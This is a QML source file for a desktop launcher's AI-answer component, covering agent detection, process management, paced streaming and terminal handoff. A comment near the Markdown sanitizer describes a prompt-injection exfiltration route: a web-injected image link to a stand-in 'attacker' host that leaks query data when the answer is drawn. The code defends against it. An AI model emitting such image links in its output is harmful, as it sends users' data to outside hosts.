import QtQuick
import Quickshell
import Quickshell.Io
import qs.Commons
import "ai/AiBackend.js" as AiBackend

// AI answers for the launcher: config, agent discovery and switching, the
// two generation process slots, the paced reveal and the terminal handoff.
// Owns no UI -- Menu.qml draws the chip, the agent bar and the answer from
// the state here and forwards keys to it. Everything it needs from the menu
// (the query, the state file, closing the launcher) goes through `menu`.
Item {
  id: ai

  required property var menu

  // AI answers, ported from omarchy-find (ai/*.js, MIT). A query that opens
  // with the prefix ("ai ") is a question for the configured agent instead
  // of a search: nothing leaves the machine until Enter, the answer streams
  // into the card, and Enter again continues the conversation in a terminal.
  // Config: ai.json next to state.json, falling back to the
  // Omarchy default agent. See ai/AiAdapters.js for the tool restrictions
  // every headless run is started with.
  // Next to state.json rather than in the plugin directory: an edit there
  // reloads every shell plugin, and removing the plugin would take it along.
  readonly property string aiConfigPath: ai.menu.stateDir + "/ai.json"
  readonly property string omarchyAgentPath: ai.menu.homeDir + "/.config/omarchy/defaults/agent"
  property string aiPrefix: "ai "
  readonly property var aiPromptOrNull: ai.menu.tabsActive ? AiBackend.matchPrefix(ai.menu.filterText, ai.aiPrefix) : null
  readonly property bool isAiMode: ai.aiPromptOrNull !== null
  readonly property string aiPromptText: ai.isAiMode ? ai.aiPromptOrNull : ""
  property var aiSession: null
  property bool aiConfigLoaded: false
  property string aiConfigWarning: ""
  property var aiConfigLastRawText: undefined
  property var aiConfigLastOmarchyAgent: undefined
  property var aiConfigPendingRaw: null
  property int aiStreamFlushMs: 16
  property int aiMaxAnswerRows: 6
  property bool aiBinaryChecked: false
  property bool aiBinaryMissing: false
  property string aiBinaryCheckedFor: ""
  property var aiPendingSpawn: null
  property int aiHandoffAttempt: 0
  property string aiHandoffError: ""
  // Which agents can be asked: the enabled adapters whose CLI is on PATH,
  // probed each time AI mode opens. In AI mode the tab bar lists these
  // instead of the tabs, Tab / Shift+Tab (or Ctrl+1..n) switches between
  // them, and the last pick is remembered in state.json ("aiAgent") -- the
  // configured agent is not always the one with usage left.
  property var aiAgents: []
  property string aiAgent: ""
  readonly property var aiAgentTabs: {
    var out = []
    var all = AiBackend.selectableAgents()
    for (var i = 0; i < all.length; i++)
      if (ai.aiAgents.indexOf(all[i].id) >= 0) out.push({ id: all[i].id, label: all[i].label, icon: "󰚩" })
    return out
  }
  readonly property int aiLineHeight: Math.round(ai.menu.scaledFont(Style.font.body) * 1.45)

  onIsAiModeChanged: {
    if (ai.isAiMode) ai.probeAiAgents()
    if (ai.isAiMode) {
      ai.aiSession = AiBackend.snapshot()
      ai.ensureAiBinaryChecked()
    } else {
      ai.aiCancel()
      ai.aiSession = null
      ai.aiHandoffError = ""
    }
  }

  // --------------------------------------------------------------------- AI
  //
  // Everything here only forwards process I/O into AiBackend and renders the
  // snapshot it hands back; the state machine, the per-agent argv and the
  // streaming pace all live in ai/*.js. Ported from omarchy-find's Find.qml,
  // whose comments explain the process-slot and handoff invariants kept here.

  // Both config sources are re-read on every open, through the same guarded
  // reader as the menu JSONC, rather than watched.
  function loadAiConfig() {
    if (aiConfigProc.running || aiAgentProc.running) return
    aiConfigProc.command = ai.menu.readFileCommand(ai.aiConfigPath, 65536)
    aiConfigProc.running = true
  }

  function applyAiConfig(rawText, omarchyAgent) {
    var agent = String(omarchyAgent || "").trim()
    if (ai.aiConfigLoaded && rawText === ai.aiConfigLastRawText && agent === ai.aiConfigLastOmarchyAgent) return
    ai.aiConfigLastRawText = rawText
    ai.aiConfigLastOmarchyAgent = agent
    var result = AiBackend.loadConfig(rawText, agent)
    if (ai.aiAgent) AiBackend.setAgent(ai.aiAgent)
    ai.aiConfigLoaded = true
    ai.aiConfigWarning = result.warning || ""
    var cfg = AiBackend.getConfig()
    ai.aiPrefix = cfg.prefix
    ai.aiStreamFlushMs = cfg.streamFlushMs
    ai.aiMaxAnswerRows = cfg.maxAnswerRows
    if (ai.isAiMode) {
      ai.aiSession = AiBackend.snapshot()
      ai.ensureAiBinaryChecked()
    }
  }

  function probeAiAgents() {
    if (aiAgentProbe.running) return
    var all = AiBackend.selectableAgents()
    var binaries = []
    for (var i = 0; i < all.length; i++) binaries.push(all[i].binary)
    aiAgentProbe.command = ["sh", "-c",
      'for b; do command -v -- "$b" >/dev/null 2>&1 && printf "%s\\n" "$b"; done', "sh"].concat(binaries)
    aiAgentProbe.running = true
  }

  function applyAiAgentProbe(text) {
    var found = String(text || "").split("\n")
    var all = AiBackend.selectableAgents()
    var agents = []
    for (var i = 0; i < all.length; i++) if (found.indexOf(all[i].binary) >= 0) agents.push(all[i].id)
    ai.aiAgents = agents
    if (agents.length === 0) return

    // Remembered pick, else the configured agent, else the first installed.
    var wanted = [String(ai.menu.stateData.aiAgent || ""), ai.aiAgent, AiBackend.getConfig().agent]
    var pick = agents[0]
    for (var w = 0; w < wanted.length; w++) if (agents.indexOf(wanted[w]) >= 0) { pick = wanted[w]; break }
    ai.setAiAgent(pick, false)
  }

  // Switching agent drops whatever the previous one was doing: the next
  // Enter asks the new agent from scratch.
  function setAiAgent(id, remember) {
    if (ai.aiAgents.indexOf(id) < 0) return
    var changed = id !== ai.aiAgent || AiBackend.getConfig().agent !== id
    if (!AiBackend.setAgent(id)) return
    ai.aiAgent = id
    if (changed) {
      ai.aiCancel()
      ai.aiHandoffError = ""
      ai.aiBinaryChecked = false
      if (ai.isAiMode) {
        ai.aiSession = AiBackend.snapshot()
        ai.ensureAiBinaryChecked()
      }
    }
    if (remember !== false && ai.menu.stateData.aiAgent !== id) ai.menu.saveState()
  }

  function cycleAiAgent(delta) {
    var list = ai.aiAgents
    if (list.length === 0) return
    var index = list.indexOf(ai.aiAgent)
    if (index < 0) index = 0
    ai.setAiAgent(list[((index + delta) % list.length + list.length) % list.length])
  }

  function ensureAiBinaryChecked() {
    var disp = AiBackend.agentDisplay()
    if (!disp.supported) {
      ai.aiBinaryChecked = true
      ai.aiBinaryMissing = true
      return
    }
    ai.aiBinaryCheckedFor = disp.binary
    if (ai.aiBinaryChecked && aiBinaryCheck.checkingFor === disp.binary) return
    if (aiBinaryCheck.running) return
    ai.aiBinaryChecked = false
    aiBinaryCheck.checkingFor = disp.binary
    aiBinaryCheck.command = ["sh", "-c", 'command -v -- "$1" >/dev/null', "sh", disp.binary]
    aiBinaryCheck.running = true
  }

  function aiKillProcessIfRunning(proc, fallbackTimer) {
    if (!proc.running) return
    var pid = proc.processId
    proc.running = false
    if (pid) {
      Quickshell.execDetached(AiBackend.killArgv(pid, "TERM"))
      fallbackTimer.targetPid = pid
      fallbackTimer.restart()
    }
  }

  // Never touches a Process whose `running` is still true; see omarchy-find
  // (and AiBackend.pickFreeSlot) for why a stopping slot is not yet free.
  function aiFreeProc() {
    var slot = AiBackend.pickFreeSlot(aiProcA.running, aiProcB.running)
    return slot === "A" ? aiProcA : (slot === "B" ? aiProcB : null)
  }

  function aiDispatchOrQueue(generation, argv) {
    var proc = ai.aiFreeProc()
    if (!proc) {
      ai.aiPendingSpawn = { generation: generation, argv: argv }
      return
    }
    ai.aiPendingSpawn = null
    proc.gen = generation
    // Spawned with stdin enabled and closed in onStarted: otherwise the child
    // inherits a stdin that never reaches EOF, and codex exec waits on it.
    proc.stdinEnabled = true
    proc.command = argv
    proc.running = true
  }

  function aiTryDispatchPending() {
    if (!ai.aiPendingSpawn) return
    var proc = ai.aiFreeProc()
    if (!proc) return
    var pending = ai.aiPendingSpawn
    ai.aiPendingSpawn = null
    proc.gen = pending.generation
    proc.stdinEnabled = true
    proc.command = pending.argv
    proc.running = true
  }

  function aiCancel(invalidateHandoff) {
    ai.aiPendingSpawn = null
    ai.aiKillProcessIfRunning(aiProcA, aiKillFallbackTimerA)
    ai.aiKillProcessIfRunning(aiProcB, aiKillFallbackTimerB)
    if (invalidateHandoff !== false) ai.aiHandoffAttempt++
    aiHandoffGrace.stop()
    AiBackend.cancel()
  }

  function aiSubmit() {
    if (!ai.isAiMode || ai.aiBinaryMissing) return
    var prompt = ai.aiPromptText.trim()
    if (prompt.length === 0) return
    ai.aiCancel()
    var result = AiBackend.beginGeneration(prompt)
    ai.aiSession = AiBackend.snapshot()
    ai.aiHandoffError = ""
    if (!result.argv) return
    ai.aiDispatchOrQueue(result.generation, result.argv)
  }

  function onAiLine(gen, line) {
    var snap = AiBackend.handleLine(gen, line)
    if (snap) ai.aiSession = snap
  }

  function onAiStderr(gen, line) {
    AiBackend.handleStderrChunk(gen, line + "\n")
  }

  function onAiExit(gen, exitCode) {
    var snap = AiBackend.handleExit(gen, exitCode)
    if (snap) ai.aiSession = snap
  }

  function aiCopyAnswer() {
    if (!ai.aiSession || ai.aiSession.state === "idle" || !ai.aiSession.rawText) return
    Quickshell.execDetached(["wl-copy", "--", ai.aiSession.rawText])
  }

  function aiPromptChangedSinceSubmit() {
    var s = ai.aiSession
    return !!(s && typeof s.prompt === "string" && s.prompt.length > 0 && ai.aiPromptText.trim() !== s.prompt)
  }

  function aiCanReask() {
    return ai.aiPromptChangedSinceSubmit() && ai.aiPromptText.trim().length > 0
  }

  function aiHandoff() {
    if (!ai.aiSession || ai.aiSession.state !== "ready" || !ai.aiSession.canHandoff) return
    if (ai.aiCanReask()) { ai.aiSubmit(); return }
    var resumeArgv = AiBackend.buildHandoffArgv()
    if (!resumeArgv) return
    var snap = AiBackend.beginHandoff()
    if (!snap) return
    ai.aiSession = snap
    ai.aiHandoffError = ""
    ai.aiHandoffAttempt++
    aiHandoffProcess.attempt = ai.aiHandoffAttempt
    aiHandoffProcess.resumeArgv = resumeArgv
    aiHandoffProcess.handled = false
    // The equals form: xdg-terminal-exec reads "--dir DIR" as a command.
    aiHandoffProcess.command = ["xdg-terminal-exec", "--dir=" + ai.menu.homeDir, "--"].concat(resumeArgv)
    aiHandoffProcess.running = true
    aiHandoffGrace.restart()
  }

  // Close the launcher on behalf of the AI flow. preserveHandoffAttempt is
  // true only when a handoff itself concludes (see omarchy-find's dismiss).
  function aiDismiss(preserveHandoffAttempt) {
    ai.aiCancel(!preserveHandoffAttempt)
    ai.aiSession = AiBackend.snapshot()
    ai.menu.closeLauncher()
  }

  function aiChipText() {
    var s = ai.aiSession
    if (!s) return "AI"
    var parts = ["AI", s.agentLabel]
    if (s.modelLabel) parts.push(s.modelLabel)
    if (s.effortLabel) parts.push(s.effortLabel + " effort")
    var text = parts.join(" · ")
    if (ai.aiBinaryMissing && s.supported !== false) text += " · not installed"
    else if (s.state === "starting") text += " · starting…"
    else if (s.state === "running") text += (s.activity === "searching" ? " · searching…" : " · thinking…")
    else if (s.state === "draining") text += " · finishing…"
    else if (s.state === "handoff") text += " · opening terminal…"
    else if (s.state === "error") text += " · error"
    return text
  }

  function aiFooterText() {
    var s = ai.aiSession
    var state = s ? s.state : "idle"
    var hint
    if (state === "ready") {
      if (ai.aiCanReask()) hint = "Enter ask new question · Esc close"
      else hint = (s && s.canHandoff) ? "↵ continue in terminal · Ctrl+C copy · Esc close" : "Ctrl+C copy · Esc close"
    } else if (state === "handoff") {
      hint = "Opening terminal…"
    } else if (state === "error") {
      hint = "Enter retry · Esc close"
    } else if (state === "starting" || state === "running" || state === "draining") {
      hint = "Esc cancel"
    } else if (ai.aiBinaryMissing) {
      hint = "Agent CLI not found on PATH · Esc close"
    } else {
      hint = ai.aiAgents.length > 1 ? "Enter ask · Tab switch agent · Esc close" : "Enter ask · Esc close"
    }
    if (ai.aiHandoffError) hint += "\n" + ai.aiHandoffError
    return hint
  }

  // The answer is rendered as Markdown, and answers are shaped by whatever
  // the agent read on the web. Rich text fetches images on its own, so an
  // injected `![](https://attacker/?q=...)` would be a request made the
  // moment it is drawn. Images are demoted to plain links and raw HTML is
  // escaped before rendering; links open only when clicked, and only http(s).
  function aiRenderable(text) {
    return String(text || "").replace(/!\[/g, "[").replace(/</g, "\\<")
  }

  function aiOpenLink(link) {
    if (/^https?:\/\//i.test(String(link || ""))) ai.menu.openUrl(String(link))
  }

  // ai.json, then the Omarchy default agent; applied once both are in. A
  // missing file reads as empty, which AiConfig treats as "use defaults".
  Process {
    id: aiConfigProc
    stdout: StdioCollector { id: aiConfigOut; waitForEnd: true }
    onExited: function(exitCode) {
      ai.aiConfigPendingRaw = exitCode === 0 ? String(aiConfigOut.text || "") : null
      aiAgentProc.command = ai.menu.readFileCommand(ai.omarchyAgentPath, 4096)
      aiAgentProc.running = true
    }
  }

  Process {
    id: aiAgentProc
    stdout: StdioCollector { id: aiAgentOut; waitForEnd: true }
    onExited: function(exitCode) {
      ai.applyAiConfig(ai.aiConfigPendingRaw, exitCode === 0 ? String(aiAgentOut.text || "") : "")
    }
  }

  Process {
    id: aiAgentProbe
    stdout: StdioCollector { id: aiAgentProbeOut; waitForEnd: true }
    onExited: ai.applyAiAgentProbe(aiAgentProbeOut.text)
  }

  Process {
    id: aiBinaryCheck
    property string checkingFor: ""
    onExited: function(exitCode) {
      if (aiBinaryCheck.checkingFor === ai.aiBinaryCheckedFor) {
        ai.aiBinaryMissing = exitCode !== 0
        ai.aiBinaryChecked = true
      } else {
        Qt.callLater(ai.ensureAiBinaryChecked)
      }
    }
  }

  // Two slots alternate per generation; only aiDispatchOrQueue and
  // aiTryDispatchPending may set command/running on them.
  Process {
    id: aiProcA
    property int gen: 0
    onStarted: aiProcA.stdinEnabled = false
    stdout: SplitParser { onRead: function(line) { ai.onAiLine(aiProcA.gen, line) } }
    stderr: SplitParser { onRead: function(line) { ai.onAiStderr(aiProcA.gen, line) } }
    onExited: function(exitCode) {
      aiKillFallbackTimerA.stop()
      aiKillFallbackTimerA.targetPid = null
      ai.onAiExit(aiProcA.gen, exitCode)
      Qt.callLater(ai.aiTryDispatchPending)
    }
  }

  Process {
    id: aiProcB
    property int gen: 0
    onStarted: aiProcB.stdinEnabled = false
    stdout: SplitParser { onRead: function(line) { ai.onAiLine(aiProcB.gen, line) } }
    stderr: SplitParser { onRead: function(line) { ai.onAiStderr(aiProcB.gen, line) } }
    onExited: function(exitCode) {
      aiKillFallbackTimerB.stop()
      aiKillFallbackTimerB.targetPid = null
      ai.onAiExit(aiProcB.gen, exitCode)
      Qt.callLater(ai.aiTryDispatchPending)
    }
  }

  // The agent runs in its own process group (setsid, AiBackend.wrapForGroup);
  // anything in it still alive half a second after SIGTERM gets SIGKILL.
  Timer {
    id: aiKillFallbackTimerA
    property var targetPid: null
    interval: 500
    onTriggered: {
      if (aiKillFallbackTimerA.targetPid) {
        Quickshell.execDetached(AiBackend.killArgv(aiKillFallbackTimerA.targetPid, "KILL"))
        aiKillFallbackTimerA.targetPid = null
      }
    }
  }

  Timer {
    id: aiKillFallbackTimerB
    property var targetPid: null
    interval: 500
    onTriggered: {
      if (aiKillFallbackTimerB.targetPid) {
        Quickshell.execDetached(AiBackend.killArgv(aiKillFallbackTimerB.targetPid, "KILL"))
        aiKillFallbackTimerB.targetPid = null
      }
    }
  }

  // The paced "typewriter" reveal; runs only while an answer is streaming.
  Timer {
    id: aiDrainTimer
    interval: Math.max(8, ai.aiStreamFlushMs)
    repeat: true
    running: !!(ai.aiSession && (ai.aiSession.state === "running" || ai.aiSession.state === "draining"))
    onTriggered: {
      var snap = AiBackend.tick()
      if (snap) ai.aiSession = snap
    }
  }

  Process {
    id: aiHandoffProcess
    property bool handled: true
    property int attempt: 0
    property var resumeArgv: null
    stderr: StdioCollector { id: aiHandoffStderr; waitForEnd: false }
    onExited: function(exitCode) {
      var alreadyHandled = aiHandoffProcess.handled
      aiHandoffProcess.handled = true
      aiHandoffGrace.stop()
      var superseded = aiHandoffProcess.attempt !== ai.aiHandoffAttempt
      if (exitCode === 0) {
        if (!alreadyHandled && !superseded) ai.aiDismiss()
        return
      }
      console.warn("[omarchy-menu-omni/ai] terminal handoff failed (exit " + exitCode + "): " + (aiHandoffStderr.text || "(no stderr)"))
      if (superseded) return
      if (!alreadyHandled) {
        ai.aiHandoffError = "Could not open a terminal — try again or check your default terminal setup"
        var snap = AiBackend.cancelHandoff()
        if (snap) ai.aiSession = snap
      } else if (aiHandoffProcess.resumeArgv) {
        Quickshell.execDetached(["notify-send", "Menu AI",
          "Terminal failed to open — resume manually: " + aiHandoffProcess.resumeArgv.join(" ")])
      }
    }
  }

  // Still running after the grace window: the terminal launched.
  Timer {
    id: aiHandoffGrace
    interval: 400
    onTriggered: {
      if (aiHandoffProcess.handled) return
      aiHandoffProcess.handled = true
      if (aiHandoffProcess.attempt !== ai.aiHandoffAttempt) return
      ai.aiDismiss(true)
    }
  }
}
